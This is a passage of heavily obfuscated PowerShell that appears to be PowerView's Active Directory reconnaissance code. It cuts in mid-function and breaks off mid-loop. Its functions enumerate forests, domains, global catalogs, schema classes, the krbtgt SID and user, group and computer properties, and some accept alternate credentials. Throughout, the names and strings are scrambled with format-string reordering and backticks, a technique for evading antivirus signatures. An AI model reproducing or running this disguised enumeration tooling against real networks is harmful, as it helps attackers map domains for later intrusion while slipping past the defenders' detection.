    [OutputType({"{0}{12}{7}{4}{2}{1}{8}{5}{11}{10}{6}{13}{9}{14}{15}{3}" -f'Sy','ices.ActiveD','Serv','ler','tory','ect','.','irec','ir','mainCo','ry','o','stem.D','Do','ntro','l'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSitIon = 0, VaLueFRompipeLInE = ${T`RUe})]
        [String]
        ${D`OMa`in},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{2}{1}"-f'Dom','roller','t','ainCon'})]
        [String]
        ${sE`RVEr},

        [Switch]
        ${L`dAP},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`Re`D`entIaL} =  ${p`kfezN}::"Em`PtY"
    )

    PROCESS {
        ${argUME`N`Ts} = @{}
        if (${PS`BOuNd`p`A`RAMETErs}[("{2}{1}{0}" -f 'n','omai','D')]) { ${ARgUm`EN`Ts}[("{0}{1}"-f 'Dom','ain')] = ${d`oMAin} }
        if (${p`Sbo`Undpar`Am`E`TErs}[("{0}{2}{3}{1}" -f 'Cr','l','ed','entia')]) { ${Ar`gU`meNts}[("{2}{1}{0}"-f'dential','re','C')] = ${c`R`eDeNTI`Al} }

        if (${PsB`oun`dPa`R`AmETE`Rs}[("{0}{1}" -f 'LDA','P')] -or ${P`S`Bou`Ndpar`AmEtERs}[("{1}{0}" -f 'er','Serv')]) {
            if (${psBO`UndPArAme`T`e`RS}[("{1}{0}"-f'erver','S')]) { ${A`RguME`Nts}[("{0}{1}"-f 'Serve','r')] = ${Ser`V`ER} }

            ${a`RGuME`NtS}[("{2}{1}{0}"-f'er','t','LDAPFil')] = (("{13}{7}{2}{10}{5}{1}{9}{11}{3}{12}{4}{0}{8}{6}"-f'8','2.84','untCo','3556','803:=','rol:1.','2)','erAcco','19','0.','nt','11','.1.4.','(us'))

            &("{2}{1}{4}{3}{0}"-f 'omputer','t','Ge','omainC','-D') @Arguments
        }
        else {
            ${FoUn`d`d`oMaiN} = &("{1}{2}{0}"-f'n','Ge','t-Domai') @Arguments
            if (${f`ounD`dom`AIN}) {
                ${F`OunD`DOmA`iN}."d`o`mAin`Co`Nt`ROLLeRs"
            }
        }
    }
}

function GET`-fOR`esT {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{4}{2}{1}" -f'PSS','cess','dPro','h','oul'}, '')]
    [OutputType({"{10}{1}{5}{6}{7}{12}{2}{9}{4}{0}{11}{3}{8}" -f 'Cu','tem.','Aut','O','PS','M','ana','ge','bject','omation.','Sys','stom','ment.'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSItioN = 0, VALUEfrOmPipELINE = ${T`Rue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${F`o`REST},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crEDE`N`Ti`Al} =   (  &("{2}{0}{1}"-f'Chi','ldItEM','GEt-')  ("VA"+"RIab"+"le:pKfeZ"+"N"))."vAL`Ue"::"E`MptY"
    )

    PROCESS {
        if (${Psb`OUnD`P`Ar`AMete`RS}[("{0}{1}{2}" -f 'Crede','nt','ial')]) {

            &("{2}{1}{3}{0}"-f'-Verbose','r','W','ite') ("{4}{7}{8}{11}{12}{1}{6}{9}{2}{3}{5}{0}{10}" -f 'r Get-','] Using','ernate cr','edent','[Get-F','ials fo',' ','o','r','alt','Forest','es','t')

            if (${pS`B`O`UNDPARAmeTe`RS}[("{0}{1}" -f'Fores','t')]) {
                ${tAR`GEtF`oreST} = ${fore`sT}
            }
            else {

                ${TaRG`Etf`O`ResT} = ${CRED`En`TIAL}.("{2}{4}{1}{3}{0}" -f'ential','etworkCr','Ge','ed','tN').Invoke()."DOMA`iN"
                &("{0}{1}{2}{3}"-f 'Writ','e-V','erbos','e') ('[Get-F'+'o'+'r'+'es'+'t] '+'Extracte'+'d'+' '+'doma'+'i'+'n '+"'$Forest' "+'fr'+'om '+'-Cr'+'edentia'+'l')
            }

            ${For`eSt`CO`NtEXT} = &("{1}{2}{0}"-f 'ect','New-Ob','j') ("{4}{2}{9}{10}{7}{8}{3}{12}{1}{5}{13}{11}{6}{0}" -f'xt','ry','y','s.Act','S','.Dir','onte','c','toryService','stem.D','ire','oryC','iveDirecto','ect')(("{0}{1}"-f 'Fore','st'), ${TarG`eTFO`R`Est}, ${CRe`d`ENTI`AL}."uSe`Rn`AME", ${C`REdE`Nt`iAl}.("{3}{1}{0}{4}{2}"-f'rede','orkC','al','GetNetw','nti').Invoke()."pAs`sW`ORD")

            try {
                ${fo`ResT`o`B`JEcT} =  ${x`Ry}::("{1}{0}"-f'etForest','G').Invoke(${Fo`RE`sT`cOntext})
            }
            catch {
                &("{0}{3}{2}{1}" -f 'Write-','ose','b','Ver') ('[Get-F'+'ore'+'st] '+'Th'+'e '+'s'+'p'+'eci'+'fied '+'f'+'ore'+'st '+"'$TargetForest' "+'do'+'es '+'not'+' '+'e'+'xis'+'t, '+'coul'+'d '+'n'+'ot '+'be'+' '+'c'+'ontacted,'+' '+'th'+'ere '+('isn{'+'0}t'+' ')-f  [ChAr]39+'an'+' '+'e'+'x'+'isting '+'trus'+'t,'+' '+'or'+' '+'t'+'he '+'spec'+'ifie'+'d '+'credenti'+'a'+'ls'+' '+'a'+'re '+'in'+'val'+'id: '+"$_")
                ${n`ULl}
            }
        }
        elseif (${PS`B`OuN`dparam`EtErS}[("{1}{0}" -f'est','For')]) {
            ${F`O`REs`TcO`Ntext} = &("{2}{0}{1}" -f'ew-Obje','ct','N') ("{9}{6}{14}{2}{12}{8}{5}{0}{10}{11}{7}{1}{15}{3}{13}{4}" -f 's.','cto','r','Co','xt','e','ste','veDire','ervic','Sy','Act','i','yS','nte','m.Directo','ry.Directory')(("{1}{0}" -f'est','For'), ${f`o`ReSt})
            try {
                ${ForeST`O`Bj`ecT} =   ( &("{3}{0}{2}{1}"-f'T','e','-VaRIabl','gE')  ("{1}{0}"-f'y','xr'))."V`Alue"::("{2}{1}{0}" -f'est','etFor','G').Invoke(${FOre`s`TC`onTExT})
            }
            catch {
                &("{1}{2}{0}"-f 'bose','Wri','te-Ver') ('['+'Get-'+'Forest] '+'The'+' '+'sp'+'ec'+'ified '+'fo'+'r'+'est '+"'$Forest' "+'do'+'es '+'no'+'t '+'exist,'+' '+'could'+' '+'no'+'t '+'b'+'e '+'co'+'ntacted,'+' '+'or'+' '+'th'+'ere '+('isn'+'fIQt ')."Rep`LACE"(([CHAr]102+[CHAr]73+[CHAr]81),[sTrinG][CHAr]39)+'a'+'n '+'exi'+'stin'+'g'+' '+'trust'+': '+"$_")
                return ${N`ULl}
            }
        }
        else {

            ${fOR`eStObJ`eCt} =  (&("{0}{1}" -f'G','ci')  ("{1}{0}{2}" -f'IabLe:xR','var','Y') )."v`AluE"::("{0}{4}{1}{2}{3}"-f 'G','rent','F','orest','etCur').Invoke()
        }

        if (${Fo`ReSTOBJ`Ect}) {

            if (${psbO`Und`PaRaMeT`E`Rs}[("{3}{1}{0}{2}" -f 'dent','re','ial','C')]) {
                ${F`oReST`SiD} = (&("{0}{1}{2}" -f 'Get-Doma','inU','ser') -Identity ("{1}{0}"-f 'rbtgt','k') -Domain ${fOR`es`Tobje`ct}."R`OOtDOMA`IN"."N`AME" -Credential ${c`ReD`eN`TIAL})."OBJEc`Ts`Id"
            }
            else {
                ${ForES`T`Sid} = (&("{0}{2}{3}{1}"-f 'Get-D','r','omain','Use') -Identity ("{0}{1}"-f 'krbt','gt') -Domain ${F`ORe`STObJ`ect}."R`ooT`dO`MaiN"."N`AMe")."oB`JEctsiD"
            }

            ${PA`R`Ts} = ${f`orEstS`id} -Split '-'
            ${f`OrEsTS`iD} = ${Pa`R`Ts}[0..$(${pa`RtS}."Le`NGth"-2)] -join '-'
            ${fo`REst`oBj`ecT} | &("{2}{0}{1}" -f'dd-Memb','er','A') ("{1}{2}{0}" -f 'ty','NotePr','oper') ("{2}{1}{0}" -f 'mainSid','o','RootD') ${fo`REsT`siD}
            ${F`OReS`TObJ`ect}
        }
    }
}

function GET-`For`EST`doM`AiN {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{1}"-f'PSShou','dProcess','l'}, '')]
    [OutputType({"{13}{7}{5}{2}{11}{12}{9}{10}{3}{8}{6}{4}{0}{1}" -f 'oma','in','rector','irect','.D','Di','ry','stem.','o','es.Act','iveD','ySer','vic','Sy'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsiTioN = 0, VAlUEFROMpiPeLIne = ${T`RuE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${fOr`esT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`eDE`NTIal} =  (&("{0}{1}"-f 'Di','R') ("{1}{3}{2}{0}"-f'feZn','var','Ble:Pk','Ia')  )."VAl`UE"::"EM`ptY"
    )

    PROCESS {
        ${a`RGumEn`Ts} = @{}
        if (${pS`Bo`UNdpAr`AmEt`e`Rs}[("{1}{0}" -f 'orest','F')]) { ${a`RGUME`NTS}[("{0}{1}" -f'For','est')] = ${fore`ST} }
        if (${psBOu`N`dpara`meterS}[("{1}{2}{0}" -f 'l','Credenti','a')]) { ${arG`U`M`enTS}[("{1}{2}{0}" -f'ial','Creden','t')] = ${c`REDeNT`iaL} }

        ${FOr`eSt`ob`JecT} = &("{1}{0}{2}"-f'-Fores','Get','t') @Arguments
        if (${fOres`TOb`jecT}) {
            ${fO`Rest`O`BjeCt}."doM`AINs"
        }
    }
}

function gE`T-fO`ReStg`Lo`Bal`cA`Talog {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{1}{0}"-f 'ss','Proce','PS','Should'}, '')]
    [OutputType({"{9}{0}{6}{2}{3}{1}{5}{4}{8}{7}{10}"-f 'tem.Di','ices.A','ec','toryServ','iveDi','ct','r','lobalC','rectory.G','Sys','atalog'})]
    [CmdletBinding()]
    Param(
        [Parameter(posiTION = 0, VaLuEfrOMPIPEliNE = ${t`Rue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${f`oreST},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`ED`EnTi`Al} =   (  &("{1}{0}"-f'i','Gc')  ("{2}{0}{1}" -f ':pk','feZN','vaRIaBLe') )."V`ALUe"::"e`mpTy"
    )

    PROCESS {
        ${arGU`M`eNtS} = @{}
        if (${pSBOUND`pAR`AMe`TerS}[("{0}{1}"-f'F','orest')]) { ${ARGU`m`enTS}[("{1}{0}"-f't','Fores')] = ${f`OrESt} }
        if (${psBou`Ndp`AR`AMeTErS}[("{1}{0}{2}"-f 'edenti','Cr','al')]) { ${arg`UMEN`TS}[("{1}{2}{3}{0}"-f 'l','Cre','d','entia')] = ${cre`denTi`AL} }

        ${Fo`Resto`B`Ject} = &("{0}{2}{1}"-f'Get-F','st','ore') @Arguments

        if (${fo`REs`To`BJect}) {
            ${f`OrES`TOBJ`ecT}.("{1}{2}{4}{0}{5}{3}"-f 'a','Find','AllG','s','lob','lCatalog').Invoke()
        }
    }
}

function GeT-fO`RES`T`SCh`EM`AC`lAss {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{0}{2}" -f'uldP','PS','rocess','Sho'}, '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(pOSiTioN = 0, vAlUEFRoMpiPeline = ${tR`Ue})]
        [Alias({"{0}{1}"-f 'C','lass'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Cl`ASS`N`AMe},

        [Alias({"{1}{0}"-f'e','Nam'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${fo`REsT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`R`eDEntIAL} =  (&("{0}{1}"-f 'iT','eM')  ("{3}{0}{2}{1}" -f'BL',':PKFeZn','e','vARIA') )."va`LUE"::"EM`pTy"
    )

    PROCESS {
        ${A`R`GUmeNTS} = @{}
        if (${psBoU`Nd`pa`RAM`ET`Ers}[("{0}{1}"-f 'Fo','rest')]) { ${ARGUm`e`N`TS}[("{1}{0}" -f 'st','Fore')] = ${fore`sT} }
        if (${p`sb`OuNDP`ARam`EteRS}[("{3}{0}{2}{1}"-f'de','l','ntia','Cre')]) { ${AR`GUmE`NtS}[("{0}{2}{1}"-f'Cr','ntial','ede')] = ${cred`ENT`iaL} }

        ${fO`ReS`Tob`JEcT} = &("{2}{0}{1}{3}" -f 'e','s','Get-For','t') @Arguments

        if (${FO`Re`stObj`E`Ct}) {
            if (${P`s`BOu`N`dparAmE`TerS}[("{2}{1}{3}{0}" -f 'ame','ss','Cla','N')]) {
                ForEach (${TaRGE`TCla`SS} in ${Cl`ASs`NamE}) {
                    ${fore`StobJ`E`CT}."sc`HemA".("{0}{1}{2}" -f 'FindC','la','ss').Invoke(${T`Arg`eT`class})
                }
            }
            else {
                ${F`OREStObJE`ct}."S`ChEmA".("{2}{1}{0}" -f'asses','l','FindAllC').Invoke()
            }
        }
    }
}

function F`I`Nd-`Dom`AIn`o`BjECTpRo`pErTyOuTLiER {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{3}{2}" -f'Sh','PS','rocess','ouldP'}, '')]
    [OutputType({"{3}{1}{6}{2}{0}{4}{5}"-f 'yOu','owe','iew.Propert','P','tli','er','rV'})]
    [CmdletBinding(dEfAULTpArAMEteRSEtNamE = {"{0}{2}{1}"-f'Class','e','Nam'})]
    Param(
        [Parameter(PoSITiOn = 0, MandatORY = ${TR`UE}, pAramETerSEtNAMe = "CLasS`Name")]
        [Alias({"{1}{0}" -f 'ass','Cl'})]
        [ValidateSet({"{0}{1}" -f 'Us','er'}, {"{1}{0}" -f'oup','Gr'}, {"{2}{0}{1}"-f 't','er','Compu'})]
        [String]
        ${clAss`NA`Me},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${rEfERE`NCe`P`RopE`Rtyset},

        [Parameter(vaLueFROmpipEline = ${Tr`UE}, maNdaTORy = ${TR`Ue}, PAramETeRsEtnAME = "reF`E`RencEOB`JECt")]
        [PSCustomObject]
        ${reFE`R`e`NCEOBJ`EcT},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`maIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}"-f'lte','r','Fi'})]
        [String]
        ${l`dAPf`i`LtEr},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}" -f 'th','ADSP','a'})]
        [String]
        ${SE`A`RChBASE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{3}{0}{2}{1}" -f'ntrol','er','l','mainCo','Do'})]
        [String]
        ${s`eR`Ver},

        [ValidateSet({"{1}{0}"-f'se','Ba'}, {"{2}{1}{0}"-f 'vel','Le','One'}, {"{0}{1}" -f 'Sub','tree'})]
        [String]
        ${SeAr`ch`sc`opE} = ("{2}{1}{0}"-f'ree','ubt','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rE`suLt`pAgE`SIZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`eRV`ERTImElI`m`IT},

        [Switch]
        ${Tom`Bs`TOnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`ReDent`iAl} =  (  &("{1}{2}{0}"-f 'ble','G','eT-vArIa')  ("{0}{1}" -f'PKFEz','n')  -Va  )::"Emp`Ty"
    )

    BEGIN {
        ${USERR`EFErE`NCe`p`ROp`e`RTYsET} = @(("{0}{2}{1}" -f'admi','nt','ncou'),("{3}{1}{2}{4}{0}" -f 'texpires','co','u','ac','n'),("{0}{2}{1}"-f'badpasswordti','e','m'),("{0}{2}{3}{1}"-f'badp','nt','wdc','ou'),'cn',("{0}{1}" -f'c','odepage'),("{1}{0}{2}"-f'ntrycod','cou','e'),("{1}{3}{0}{2}"-f'cri','d','ption','es'), ("{3}{0}{2}{1}"-f'playn','me','a','dis'),("{1}{2}{3}{0}" -f 'name','di','stinguish','ed'),("{3}{2}{1}{5}{4}{0}"-f 'ndata','rop','p','dscore','gatio','a'),("{2}{0}{1}"-f 'a','me','givenn'),("{0}{1}{2}" -f'i','nstan','cetype'),("{4}{3}{2}{1}{0}"-f 'systemobject','cal','ti','scri','i'),("{0}{1}{2}" -f 'last','logo','ff'),("{1}{2}{0}{3}"-f 'tlo','la','s','gon'),("{1}{4}{3}{0}{2}"-f 'es','la','tamp','ntim','stlogo'),("{0}{2}{1}{3}"-f 'lo','utt','cko','ime'),("{2}{0}{1}"-f'coun','t','logon'),("{1}{0}{2}"-f'mbero','me','f'),("{5}{1}{3}{0}{4}{6}{2}" -f 'portedencrypt','s','pes','ds-sup','iont','m','y'),("{0}{1}" -f'n','ame'),("{1}{3}{0}{4}{2}"-f 'c','o','y','bje','tcategor'),("{1}{2}{0}"-f's','objectcla','s'),("{0}{2}{1}"-f'obje','d','ctgui'),("{1}{2}{0}" -f'id','obj','ects'),("{2}{1}{3}{0}" -f 'd','arygroup','prim','i'),("{1}{2}{0}"-f'tset','pwd','las'),("{1}{2}{4}{3}{0}"-f 'me','s','amacco','a','untn'),("{3}{1}{0}{2}"-f'accounttyp','m','e','sa'),'sn',("{0}{1}{2}{3}" -f'u','seraccoun','tcont','rol'),("{0}{3}{2}{1}{4}" -f 'use','nc','i','rpr','ipalname'),("{0}{1}{2}"-f'usn','chan','ged'),("{2}{0}{1}"-f 're','ated','usnc'),("{1}{2}{0}" -f'changed','w','hen'),("{1}{2}{0}{3}" -f'eat','when','cr','ed'))

        ${g`ROUp`R`efEREN`cepROpERTYseT} = @(("{1}{0}{2}{3}" -f 'dmi','a','n','count'),'cn',("{1}{3}{0}{2}" -f 't','d','ion','escrip'),("{1}{2}{3}{0}{4}" -f'na','d','is','tinguished','me'),("{3}{2}{4}{1}{0}"-f'ata','nd','s','d','corepropagatio'),("{0}{1}{2}" -f'gr','oupt','ype'),("{0}{2}{1}"-f 'ins','ncetype','ta'),("{2}{1}{3}{0}{4}" -f'emobj','scriticals','i','yst','ect'),("{0}{1}" -f'membe','r'),("{0}{1}" -f'memb','erof'),("{1}{0}"-f 'me','na'),("{4}{2}{1}{3}{0}"-f 'category','ec','bj','t','o'),("{3}{0}{1}{2}"-f'tc','l','ass','objec'),("{2}{0}{1}"-f 'jectgui','d','ob'),("{0}{2}{1}" -f 'ob','tsid','jec'),("{0}{2}{1}"-f'samaccount','e','nam'),("{4}{3}{2}{0}{1}" -f 'tt','ype','oun','amacc','s'),("{0}{2}{1}"-f'sy','lags','stemf'),("{3}{2}{0}{1}" -f 'han','ged','nc','us'),("{2}{0}{1}" -f 'rea','ted','usnc'),("{3}{1}{0}{2}"-f'ang','ench','ed','wh'),("{3}{0}{1}{2}" -f 'h','encreat','ed','w'))

        ${cOMpuTERr`eF`E`R`eN`cEpR`O`pErt`yseT} = @(("{3}{1}{2}{4}{0}"-f'es','count','exp','ac','ir'),("{2}{3}{1}{0}"-f'e','sswordtim','bad','pa'),("{2}{0}{3}{1}"-f'ad','t','b','pwdcoun'),'cn',("{1}{0}"-f'ge','codepa'),("{0}{3}{1}{2}"-f'country','o','de','c'),("{2}{1}{0}{3}"-f 'he','stinguis','di','dname'),("{0}{1}{2}"-f 'dnshost','nam','e'),("{5}{4}{0}{3}{2}{1}"-f 'r','ondata','ti','epropaga','o','dsc'),("{0}{2}{1}" -f 'i','type','nstance'),("{0}{2}{1}{4}{3}"-f 'iscr','ls','itica','t','ystemobjec'),("{2}{1}{0}" -f'ff','logo','last'),("{1}{2}{0}"-f 'tlogon','l','as'),("{2}{0}{4}{5}{3}{1}"-f 'a','imestamp','l','ont','stlo','g'),("{0}{2}{1}{3}{4}" -f 'localp','yf','olic','l','ags'),("{2}{1}{0}"-f't','oun','logonc'),("{3}{1}{5}{0}{4}{6}{2}"-f'dencryptionty','pport','s','msds-su','p','e','e'),("{0}{1}" -f'na','me'),("{1}{0}{2}{3}"-f'b','o','jectc','ategory'),("{1}{0}{2}{3}" -f 'ctcl','obje','a','ss'),("{2}{1}{0}" -f 'guid','t','objec'),("{2}{0}{1}" -f 'ject','sid','ob'),("{2}{0}{3}{1}" -f'perating','ystem','o','s'),("{0}{2}{3}{4}{5}{6}{1}{7}" -f 'oper','c','atingsys','temser','vi','c','epa','k'),("{1}{4}{6}{5}{2}{3}{0}"-f'n','ope','emvers','io','rati','st','ngsy'),("{1}{2}{0}"-f 'oupid','primar','ygr'),("{0}{1}{2}"-f'p','wdlas','tset'),("{1}{3}{0}{2}{4}"-f 'ntn','samacc','am','ou','e'),("{1}{3}{2}{0}"-f'ype','samaccou','t','nt'),("{1}{2}{3}{0}" -f 'me','serviceprin','cipal','na'),("{2}{3}{5}{4}{1}{0}" -f'ntrol','o','u','sera','countc','c'),("{1}{2}{0}" -f'changed','us','n'),("{2}{0}{1}" -f'at','ed','usncre'),("{1}{2}{0}"-f'enchanged','w','h'),("{0}{2}{1}"-f 'whe','reated','nc'))

        ${S`E`ARc`hERarguMEnTS} = @{}
        if (${pSbO`UNDPar`A`M`ET`ERs}[("{0}{2}{1}" -f 'Doma','n','i')]) { ${Se`ARc`HeRar`guMEnTs}[("{0}{1}" -f 'Domai','n')] = ${dO`maIN} }
        if (${P`SBOu`N`DParAME`T`eRS}[("{1}{0}{3}{2}" -f 'Fi','LDAP','r','lte')]) { ${SEArCh`eRaRgu`M`Ents}[("{0}{2}{1}"-f 'L','PFilter','DA')] = ${ldAPFi`LT`ER} }
        if (${pSBoUNDP`ArAM`Et`E`Rs}[("{1}{3}{0}{2}" -f'h','Sear','Base','c')]) { ${sEARc`hER`ArGu`MEn`Ts}[("{2}{1}{0}"-f 'se','earchBa','S')] = ${Sear`CHb`Ase} }
        if (${ps`BOUN`dp`Ara`mEtErS}[("{0}{1}" -f'Ser','ver')]) { ${s`EA`Rc`HErARgUMe`N`TS}[("{0}{1}"-f 'Se','rver')] = ${s`e`RVer} }
        if (${pS`B`O`UnDPA`RAMeTeRs}[("{1}{0}{2}{3}" -f 'archSc','Se','o','pe')]) { ${s`Ear`CH`ER`Arg`UMENTs}[("{3}{2}{0}{1}"-f'S','cope','ch','Sear')] = ${S`eaRCHS`Co`pe} }
        if (${pSBouNDp`A`Ra`mET`eRS}[("{3}{0}{2}{1}"-f 'ultP','ze','ageSi','Res')]) { ${sear`chER`A`Rg`UmEn`Ts}[("{2}{1}{0}{3}" -f 'i','S','ResultPage','ze')] = ${r`eSuLt`p`AG`eSIZe} }
        if (${psboundp`Ar`AM`e`TerS}[("{1}{3}{0}{2}"-f 'i','ServerTimeLi','t','m')]) { ${S`e`A`Rch`E`RARgUmEnTs}[("{0}{3}{2}{1}"-f 'Ser','t','eLimi','verTim')] = ${Se`RVer`T`ImEli`Mit} }
        if (${PsbO`U`Ndpa`RaM`E`TerS}[("{0}{1}{2}" -f'To','mbsto','ne')]) { ${s`eaRcheR`ArguMe`Nts}[("{1}{2}{0}"-f'stone','T','omb')] = ${TO`mbs`T`ONE} }
        if (${p`sbouN`Dp`ARA`ME`TErS}[("{0}{1}{2}" -f'Cr','ede','ntial')]) { ${sEA`Rc`H`ERaRGU`meNts}[("{0}{1}{2}{3}" -f'Cre','dent','ia','l')] = ${c`R`edENtI`AL} }

        if (${psBoU`N`DpA`RAMeT`Ers}[("{1}{0}"-f'ain','Dom')]) {
            if (${pSBoundPaR`AmET`e`Rs}[("{3}{0}{1}{2}" -f 'd','entia','l','Cre')]) {
                ${TaR`GEtF`oREST} = &("{2}{1}{3}{0}" -f 'n','et-D','G','omai') -Domain ${dOm`AiN} | &("{1}{2}{0}"-f 'Object','Sele','ct-') -ExpandProperty ("{0}{1}"-f'Fo','rest') | &("{2}{3}{1}{0}" -f 't','-Objec','Sel','ect') -ExpandProperty ("{1}{0}"-f'ame','N')
            }
            else {
                ${Ta`R`G`etFor`est} = &("{0}{1}{2}{3}"-f'Get','-D','om','ain') -Domain ${DO`mA`in} -Credential ${Cr`edENt`iAL} | &("{2}{0}{1}{3}"-f 't','-Objec','Selec','t') -ExpandProperty ("{0}{2}{1}"-f'For','st','e') | &("{1}{0}{2}{3}"-f 'elect-','S','Obj','ect') -ExpandProperty ("{0}{1}" -f'Na','me')
            }
            &("{1}{2}{3}{0}"-f'se','W','rite-Ve','rbo') ('[Find-'+'Dom'+'ainObj'+'e'+'c'+'tP'+'ropertyOu'+'tli'+'er'+'] '+'E'+'numer'+'a'+'ted '+'fores'+'t '+"'$TargetForest' "+'for'+' '+'tar'+'get '+'d'+'o'+'main '+"'$Domain'")
        }

        ${scH`eMAarguM`En`Ts} = @{}
        if (${PS`B`OuNDpARAmet`erS}[("{1}{2}{0}"-f 'ial','C','redent')]) { ${sc`hEM`AaRGuME`Nts}[("{2}{1}{3}{0}"-f'ntial','re','C','de')] = ${CRe`D`ENt`IAL} }
        if (${TaRG`et`FOResT}) {
            ${SCHem`A`ArgU`meNTS}[("{1}{0}"-f'rest','Fo')] = ${ta`RgEtFo`REST}
        }
    }

    PROCESS {

        if (${pSB`ounDpara`M`E`TeRS}[("{2}{3}{4}{1}{0}{5}"-f'Se','y','Ref','erenc','ePropert','t')]) {
            &("{1}{0}{2}"-f'os','Write-Verb','e') ("{3}{8}{1}{11}{7}{13}{14}{2}{15}{12}{4}{10}{0}{6}{9}{16}{5}"-f'Reference','-Doma','tyO','[',' Using specified','ySet','Prop','nObjectP','Find','e',' -','i','lier]','rop','er','ut','rt')
            ${rEFErEN`CEoBJEcTp`Ro`peR`TIes} = ${R`eferEnCEPrOp`ertYS`ET}
        }
        elseif (${ps`BOu`NDPARA`M`ETE`Rs}[("{1}{0}{3}{2}" -f'enceOb','Refer','ect','j')]) {
            &("{1}{0}{2}" -f'ite','Wr','-Verbose') ("{30}{6}{29}{17}{35}{21}{14}{19}{9}{12}{25}{13}{28}{24}{34}{18}{27}{31}{1}{20}{0}{10}{15}{5}{11}{16}{7}{8}{32}{3}{33}{2}{4}{22}{26}{23}"-f 'e','om','e','refer',' ','o use ','Find-Doma','t','he','tlie','nceObject ','a','r','tra','ert','t','s ','Obj','y na','yOu',' -Refer','p','propert','t',' ','] Ex','y se','me','cting','in','[','s fr',' ','enc','propert','ectPro')
            ${r`EfE`REn`ce`oBjECT`PRoP`Ert`I`es} = &("{0}{2}{1}" -f'Ge','-Member','t') -InputObject ${rEfER`ENc`EOBJ`ecT} -MemberType ("{2}{0}{1}"-f'Pro','perty','Note') | &("{1}{2}{0}" -f'-Object','Sel','ect') -Expand ("{1}{0}" -f 'me','Na')
            ${rEf`eReN`C`eO`B`jeCTCLa`Ss} = ${rEFEreN`cEobj`e`CT}."objEc`T`CLasS" | &("{2}{1}{3}{0}"-f'ect','elect-Ob','S','j') -Last 1
            &("{1}{0}{2}" -f 't','Wri','e-Verbose') ('['+'F'+'ind-Domai'+'nObjectP'+'ropertyOut'+'l'+'ier] '+'Cal'+'culat'+'ed '+'Refe'+'r'+'en'+'ceObjectClass'+' '+': '+"$ReferenceObjectClass")
        }
        else {
            &("{2}{1}{0}{3}"-f'-Verb','ite','Wr','ose') ('[Find-'+'Do'+'m'+'ai'+'nOb'+'jec'+'tProper'+'t'+'yO'+'utli'+'er] '+'U'+'s'+'ing '+'the'+' '+'defaul'+'t '+'re'+'f'+'erence '+'p'+'rop'+'erty '+'s'+'et '+'for'+' '+'the'+' '+'objec'+'t '+'c'+'lass'+' '+"'$ClassName'")
        }

        if ((${CL`A`sSNAMe} -eq ("{1}{0}"-f 'r','Use')) -or (${ReF`eRe`NceO`B`jEc`Tcl`ASs} -eq ("{1}{0}"-f'ser','U'))) {
            ${o`BjEc`TS} = &("{1}{2}{4}{3}{0}" -f'er','G','et-D','nUs','omai') @SearcherArguments
            if (-not ${rE`Fer`enc`eo`BJ`EC`T`PrOP`ErtIes}) {
                ${rE`FEreN`Ceo`BJe`cTprOpE`RTIeS} = ${Us`ERrEF`ER`EnceprO`peRTYSet}
            }
        }
        elseif ((${cL`AS`SnAme} -eq ("{0}{1}"-f'G','roup')) -or (${ReF`ErEnce`oBje`ctcl`ASs} -eq ("{0}{1}" -f'G','roup'))) {
            ${ObJec`Ts} = &("{2}{3}{0}{1}" -f'u','p','Get-','DomainGro') @SearcherArguments
            if (-not ${rEF`e`R`ENce`oBJ`eCtpRop`E`RtIES}) {
                ${Re`F`ERENCEoBjectp`R`o`PeRtiEs} = ${GROUP`Re`F`ErenCEpR`OpErtYset}
            }
        }
        elseif ((${class`N`AmE} -eq ("{1}{0}{2}"-f 'm','Co','puter')) -or (${ReFEREN`c`EoBJE`CTC`l`AsS} -eq ("{1}{0}{2}" -f'put','Com','er'))) {
            ${o`BJEC`TS} = &("{2}{1}{5}{4}{0}{3}" -f 'te','in','Get-Doma','r','pu','Com') @SearcherArguments
            if (-not ${R`ef`ERE`NCeobje`ctp`R`o`P`erties}) {
                ${r`ef`EReN`ce`OB`Je`CTPROp`eRTi`eS} = ${COmpu`TerrEFeREN`C`EP`Ro`pe`RTySET}
            }
        }
        else {
            throw ('[Find'+'-Domai'+'n'+'Obj'+'ect'+'Prop'+'er'+'tyOu'+'tli'+'er'+'] '+'In'+'v'+'alid '+'class:'+' '+"$ClassName")
        }

        ForEach (${obje`cT} in ${Ob`jec`TS}) {
            ${ObJ`ECT`p`Ro`peR`TIEs} = &("{3}{2}{1}{0}"-f'ber','Mem','et-','G') -InputObject ${ob`jeCt} -MemberType ("{0}{2}{3}{1}" -f'No','rty','te','Prope') | &("{3}{1}{2}{0}{4}" -f 'b','ec','t-O','Sel','ject') -Expand ("{0}{1}" -f 'N','ame')
            ForEach(${o`Bje`c`TPrOpertY} in ${obJEctPr`oP`Erti`es}) {
